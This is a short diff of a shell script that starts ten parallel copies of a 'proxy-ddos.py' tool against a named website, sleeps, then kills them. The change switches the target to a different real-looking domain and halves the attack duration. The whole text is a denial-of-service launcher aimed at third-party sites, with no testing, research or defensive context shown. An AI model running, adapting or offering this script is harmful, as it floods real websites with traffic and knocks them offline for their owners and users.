@@ -2,10 +2,10 @@
 
 for i in {1..10};
 do
-    python proxy-ddos.py http://www.qzudui.com/index.php &
+    python proxy-ddos.py http://www.itmian4.com/ &
     echo $i
 done
 
-sleep 60
+sleep 30
 
 kill `pgrep python`
